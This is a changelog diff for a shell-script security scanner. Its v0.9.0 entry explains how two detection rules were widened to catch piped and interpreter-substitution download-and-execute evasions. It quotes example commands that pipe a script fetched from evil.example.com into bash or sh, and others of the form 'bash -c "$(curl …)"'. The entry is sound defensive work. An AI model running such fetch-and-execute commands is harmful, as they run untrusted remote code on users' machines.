@@ -7,6 +7,33 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.9.0] - 2026-10-21
+
+### Fixed
+- `pipeToShell` (`SK-SHELL-002` HIGH) now matches piped chains: the download
+  and the shell token are anchored around the LAST pipe of the logical line
+  (the post-download class is `[^\n]*` instead of `[^\n|]*`), so
+  `curl -fsSL https://evil.example.com/x.sh | grep -v '^#' | bash` and
+  `curl … | sudo tee /tmp/i.sh | sh` — where an intermediate command sits
+  between the download and the shell — trip the headline detector instead of
+  slipping past as MEDIUM with exit 0 under the default `--fail-on high`
+  gate. Single-pipe forms (`| sh`, `| /bin/sh`, `| env bash`, `| sudo -E
+  bash`, `| exec sh`), comment stripping, and the v0.8.0 comment-prose
+  false-positive fix are unchanged; a fetch piped into a non-shell tool
+  (`curl … | jq`) still does not trip SK-SHELL-002.
+- `evalDownload` (`SK-SHELL-002` HIGH) now matches the
+  interpreter-executes-command-substitution form `bash -c "$(curl …)"` /
+  `sh -c '$(wget …)'` (the interpreter head alternation accepts
+  `(sh|bash|zsh) -c` alongside `eval`): the form runs the downloaded code
+  with neither `eval` nor a pipe and used to score MEDIUM with exit 0 under
+  the default gate. `eval` double/single/unquoted and `bash <(curl …)`
+  still fire; an interpreter `-c` with no `curl`/`wget` inside stays clean.
+
+### Added
+- A per-version evasion regression test (`internal/rules/evasion_v090_test.go`)
+  covering both new chain/interpreter forms plus the full v0.6.0-v0.8.0
+  no-regression matrix and the benign cases.
+
 ## [0.8.0] - 2026-09-14
 
 ### Fixed
